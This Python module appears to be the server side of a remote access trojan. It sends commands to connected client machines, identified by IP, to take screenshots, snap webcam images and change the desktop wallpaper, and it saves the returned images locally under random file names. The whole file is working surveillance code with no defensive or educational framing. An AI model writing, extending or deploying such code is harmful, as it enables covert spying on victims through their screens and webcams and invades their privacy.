import os
import random

def handle_system_commands(server, command):
    if command == 'screenshot':
        return screenshot(server, command)
    elif command == 'webcam_snap':
        return webcam_snap(server, command)
    elif command == 'setwallpaper':
        return set_wallpaper(server)
    return "Command not recognized"

def screenshot(server, command):
    server.clients[server.current_client_ip].send(command.encode())
    file = server.clients[server.current_client_ip].recv(2147483647)
    path = f'{os.getcwd()}\\{random.randint(11111,99999)}.png'
    with open(path, 'wb') as f:
        f.write(file)
    path1 = os.path.abspath(path)
    return f"File is stored at {path1}"

def webcam_snap(server, command):
    server.clients[server.current_client_ip].send(command.encode())
    file = server.clients[server.current_client_ip].recv(2147483647)
    with open(f'{os.getcwd()}\\{random.randint(11111,99999)}.png', 'wb') as f:
        f.write(file)
    return "File is downloaded"

def set_wallpaper(server):
    server.clients[server.current_client_ip].send(b'setwallpaper')
    text = input("Enter the filename: ")
    server.clients[server.current_client_ip].send(text.encode())
    result_output = server.clients[server.current_client_ip].recv(1024).decode()
    return result_output
